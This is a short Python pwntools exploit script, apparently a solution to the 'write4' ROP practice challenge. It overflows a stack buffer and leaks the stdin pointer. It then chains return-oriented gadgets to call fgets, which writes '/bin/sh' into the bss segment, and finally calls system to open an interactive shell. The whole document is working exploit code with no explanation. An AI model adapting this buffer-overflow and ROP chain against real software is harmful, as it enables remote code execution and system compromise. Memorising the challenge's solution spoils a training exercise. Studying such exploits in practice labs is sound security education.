#!/usr/bin/env python
from pwn import *

context.binary = './write4'
#context.log_level = 'debug'

io = process('./write4')
elf = ELF('./write4')

#leak Stdin_addr file Pointer 
io.recv()
payload1 = 'A'*(0x28)
payload1 += p64(0x400893)+p64(0x601070)
payload1 += p64(0x4005D0)
payload1 += p64(elf.symbols['pwnme'])
io.sendline(payload1)
Stdin_addr = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))
log.info('Stdin_addr:'+hex(Stdin_addr))

#fgets input '/bin/sh' to bss segment,Ropgets
io.recv()
payload2 = 'A'*(0x28)
payload2 += p64(0x40088a)
payload2 += p64(0)+p64(1)+p64(elf.got['fgets'])
payload2 += p64(Stdin_addr)+p64(0x20)+p64(elf.bss()+0x28)
payload2 += p64(0x400870)
payload2 += 56*'A'
payload2 += p64(0x400893)
payload2 += p64(elf.bss()+0x28)   #escape to overwrite File stdin
payload2 += p64(elf.plt['system'])
#gdb.attach(io)
io.sendline(payload2)

io.sendline("/bin/sh\x00")

io.interactive()